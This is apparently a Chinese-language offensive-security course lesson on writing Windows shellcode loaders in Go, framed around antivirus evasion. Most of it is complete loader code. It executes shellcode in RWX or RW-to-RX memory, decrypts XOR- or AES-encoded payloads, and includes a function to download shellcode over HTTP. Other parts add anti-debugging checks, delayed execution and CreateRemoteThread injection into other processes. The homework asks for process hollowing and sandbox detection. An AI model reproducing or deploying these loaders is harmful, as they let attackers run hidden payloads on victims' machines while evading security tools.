# 课时04 - Golang实现ShellCode Loader

## 课程目标
1. 掌握Go语言调用Windows API的方法
2. 理解syscall和unsafe包的使用
3. 实现Go版本的ShellCode Loader
4. 了解Go编译的免杀特性

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| syscall | System Call | Go的系统调用包 |
| unsafe | - | 允许不安全指针操作的包 |
| CGo | - | Go调用C代码的机制 |
| uintptr | Unsigned Integer Pointer | Go中的指针整数类型 |

## 使用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| Go | 编译器 | >= 1.16 |
| Visual Studio Code | 开发环境 | Go扩展 |
| garble | 代码混淆 | 增加免杀能力 |

## 技术原理

### Go调用Windows API

```go
// 加载DLL
kernel32 := syscall.NewLazyDLL("kernel32.dll")

// 获取函数
virtualAlloc := kernel32.NewProc("VirtualAlloc")

// 调用函数
ret, _, _ := virtualAlloc.Call(
    0,                          // lpAddress
    uintptr(len(shellcode)),    // dwSize
    0x1000|0x2000,             // MEM_COMMIT|MEM_RESERVE
    0x40,                       // PAGE_EXECUTE_READWRITE
)
```

## 代码实现

### 1. 基础Go Loader

```go
// loader.go
// Go ShellCode Loader

package main

import (
    "encoding/hex"
    "fmt"
    "os"
    "syscall"
    "unsafe"
)

var (
    kernel32         = syscall.NewLazyDLL("kernel32.dll")
    ntdll            = syscall.NewLazyDLL("ntdll.dll")
    
    virtualAlloc     = kernel32.NewProc("VirtualAlloc")
    virtualProtect   = kernel32.NewProc("VirtualProtect")
    createThread     = kernel32.NewProc("CreateThread")
    waitForSingleObject = kernel32.NewProc("WaitForSingleObject")
    rtlCopyMemory    = ntdll.NewProc("RtlCopyMemory")
)

// 测试ShellCode (返回1)
var shellcode = []byte{
    0x90, 0x90, 0x90, 0x90, // NOP
    0x31, 0xC0,             // xor eax, eax
    0x40,                   // inc eax
    0xC3,                   // ret
}

// 方法1: VirtualAlloc + 函数指针
func Method1_FuncPtr() {
    fmt.Println("[*] Method 1: Function Pointer")
    
    addr, _, err := virtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x40,          // PAGE_EXECUTE_READWRITE
    )
    
    if addr == 0 {
        fmt.Printf("[-] VirtualAlloc failed: %v\n", err)
        return
    }
    
    fmt.Printf("[+] Allocated memory at: 0x%X\n", addr)
    
    // 复制ShellCode
    rtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )
    
    // 转换为函数并调用
    shellcodeFunc := syscall.NewCallback(func() uintptr {
        return 0
    })
    _ = shellcodeFunc // 占位
    
    // 实际调用 - 使用syscall.Syscall
    ret, _, _ := syscall.Syscall(addr, 0, 0, 0, 0)
    fmt.Printf("[+] ShellCode returned: %d\n", ret)
}

// 方法2: CreateThread
func Method2_Thread() {
    fmt.Println("[*] Method 2: CreateThread")
    
    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        0x1000|0x2000,
        0x40,
    )
    
    if addr == 0 {
        fmt.Println("[-] VirtualAlloc failed")
        return
    }
    
    // 复制
    rtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )
    
    // 创建线程
    thread, _, _ := createThread.Call(
        0,          // lpThreadAttributes
        0,          // dwStackSize
        addr,       // lpStartAddress
        0,          // lpParameter
        0,          // dwCreationFlags
        0,          // lpThreadId
    )
    
    if thread == 0 {
        fmt.Println("[-] CreateThread failed")
        return
    }
    
    fmt.Printf("[+] Thread created: 0x%X\n", thread)
    
    // 等待完成
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
    
    fmt.Println("[+] Thread completed")
}

// 方法3: 两步分配 (RW -> RX)
func Method3_TwoStep() {
    fmt.Println("[*] Method 3: Two-Step Allocation")
    
    // 分配RW
    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        0x1000|0x2000,
        0x04, // PAGE_READWRITE
    )
    
    if addr == 0 {
        fmt.Println("[-] VirtualAlloc failed")
        return
    }
    
    fmt.Printf("[+] Allocated RW at: 0x%X\n", addr)
    
    // 复制
    rtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )
    
    // 修改为RX
    var oldProtect uint32
    virtualProtect.Call(
        addr,
        uintptr(len(shellcode)),
        0x20, // PAGE_EXECUTE_READ
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    
    fmt.Println("[+] Changed to RX")
    
    // 执行
    thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
    
    fmt.Println("[+] Completed")
}

// 方法4: 从Hex字符串加载
func Method4_FromHex(hexStr string) {
    fmt.Println("[*] Method 4: Load from Hex String")
    
    sc, err := hex.DecodeString(hexStr)
    if err != nil {
        fmt.Printf("[-] Hex decode error: %v\n", err)
        return
    }
    
    fmt.Printf("[+] Decoded %d bytes\n", len(sc))
    
    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(sc)),
        0x1000|0x2000,
        0x40,
    )
    
    if addr == 0 {
        return
    }
    
    rtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&sc[0])),
        uintptr(len(sc)),
    )
    
    thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
}

// 方法5: XOR解密后执行
func Method5_XorDecrypt(encrypted []byte, key byte) {
    fmt.Println("[*] Method 5: XOR Decrypt and Execute")
    
    // 解密
    decrypted := make([]byte, len(encrypted))
    for i, b := range encrypted {
        decrypted[i] = b ^ key
    }
    
    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(decrypted)),
        0x1000|0x2000,
        0x40,
    )
    
    if addr == 0 {
        return
    }
    
    rtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&decrypted[0])),
        uintptr(len(decrypted)),
    )
    
    thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
}

// 加密工具
func xorEncrypt(data []byte, key byte) []byte {
    result := make([]byte, len(data))
    for i, b := range data {
        result[i] = b ^ key
    }
    return result
}

func main() {
    fmt.Println("========================================")
    fmt.Println("     Go ShellCode Loader               ")
    fmt.Println("========================================")
    fmt.Println()
    
    Method1_FuncPtr()
    fmt.Println()
    
    Method2_Thread()
    fmt.Println()
    
    Method3_TwoStep()
    fmt.Println()
    
    // 从命令行参数加载
    if len(os.Args) >= 2 {
        Method4_FromHex(os.Args[1])
    }
    
    fmt.Println("[*] Done")
}
```

### 2. 高级Go Loader

```go
// advanced_loader.go
// 高级Go ShellCode Loader

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "net/http"
    "syscall"
    "time"
    "unsafe"
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    ntdll    = syscall.NewLazyDLL("ntdll.dll")
    
    virtualAlloc        = kernel32.NewProc("VirtualAlloc")
    virtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
    createThread        = kernel32.NewProc("CreateThread")
    createRemoteThread  = kernel32.NewProc("CreateRemoteThread")
    openProcess         = kernel32.NewProc("OpenProcess")
    writeProcessMemory  = kernel32.NewProc("WriteProcessMemory")
    waitForSingleObject = kernel32.NewProc("WaitForSingleObject")
    closeHandle         = kernel32.NewProc("CloseHandle")
    rtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
    
    // 反调试
    isDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
)

// 远程下载ShellCode
func downloadShellcode(url string) ([]byte, error) {
    client := &http.Client{
        Timeout: 30 * time.Second,
    }
    
    resp, err := client.Get(url)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    
    return ioutil.ReadAll(resp.Body)
}

// AES解密
func aesDecrypt(ciphertext, key, iv []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    mode := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(ciphertext))
    mode.CryptBlocks(plaintext, ciphertext)
    
    // 去除PKCS7填充
    padding := int(plaintext[len(plaintext)-1])
    return plaintext[:len(plaintext)-padding], nil
}

// 反调试检查
func isDebugged() bool {
    ret, _, _ := isDebuggerPresent.Call()
    return ret != 0
}

// 时间检测反调试
func timingCheck() bool {
    t1 := time.Now()
    // 一些操作
    for i := 0; i < 1000; i++ {
        _ = i * i
    }
    t2 := time.Now()
    
    // 如果执行时间过长，可能被调试
    return t2.Sub(t1) > 100*time.Millisecond
}

// 远程线程注入
func injectToProcess(pid uint32, shellcode []byte) error {
    // 打开进程
    const PROCESS_ALL_ACCESS = 0x1F0FFF
    
    hProcess, _, err := openProcess.Call(
        PROCESS_ALL_ACCESS,
        0,
        uintptr(pid),
    )
    
    if hProcess == 0 {
        return fmt.Errorf("OpenProcess failed: %v", err)
    }
    defer closeHandle.Call(hProcess)
    
    fmt.Printf("[+] Opened process: 0x%X\n", hProcess)
    
    // 分配远程内存
    remoteMem, _, _ := virtualAllocEx.Call(
        hProcess,
        0,
        uintptr(len(shellcode)),
        0x1000|0x2000,
        0x40,
    )
    
    if remoteMem == 0 {
        return fmt.Errorf("VirtualAllocEx failed")
    }
    
    fmt.Printf("[+] Remote memory: 0x%X\n", remoteMem)
    
    // 写入
    var written uintptr
    writeProcessMemory.Call(
        hProcess,
        remoteMem,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&written)),
    )
    
    fmt.Printf("[+] Written: %d bytes\n", written)
    
    // 创建远程线程
    hThread, _, _ := createRemoteThread.Call(
        hProcess,
        0,
        0,
        remoteMem,
        0,
        0,
        0,
    )
    
    if hThread == 0 {
        return fmt.Errorf("CreateRemoteThread failed")
    }
    
    fmt.Printf("[+] Remote thread: 0x%X\n", hThread)
    
    waitForSingleObject.Call(hThread, 0xFFFFFFFF)
    closeHandle.Call(hThread)
    
    return nil
}

// 延迟执行
func delayedExecution(shellcode []byte, delaySeconds int) {
    fmt.Printf("[*] Waiting %d seconds...\n", delaySeconds)
    time.Sleep(time.Duration(delaySeconds) * time.Second)
    
    executeShellcode(shellcode)
}

// 执行ShellCode
func executeShellcode(sc []byte) {
    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(sc)),
        0x1000|0x2000,
        0x40,
    )
    
    if addr == 0 {
        return
    }
    
    rtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&sc[0])),
        uintptr(len(sc)),
    )
    
    thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
}

func main() {
    fmt.Println("========================================")
    fmt.Println("     Advanced Go ShellCode Loader      ")
    fmt.Println("========================================")
    
    // 反调试检查
    if isDebugged() {
        fmt.Println("[-] Debugger detected!")
        return
    }
    
    if timingCheck() {
        fmt.Println("[-] Timing anomaly detected!")
        return
    }
    
    fmt.Println("[+] Anti-debug checks passed")
    
    // 示例：从Base64加载
    encoded := "kJCQkDHA" // 对应 NOP + xor eax,eax (部分)
    shellcode, _ := base64.StdEncoding.DecodeString(encoded)
    
    if len(shellcode) > 0 {
        executeShellcode(shellcode)
    }
}
```

## 课后作业

### 作业1：添加更多加密算法
实现RC4和ChaCha20加密解密支持。

### 作业2：实现进程镂空
使用Go实现进程镂空(Process Hollowing)技术。

### 作业3：添加沙箱检测
实现常见沙箱环境的检测功能。
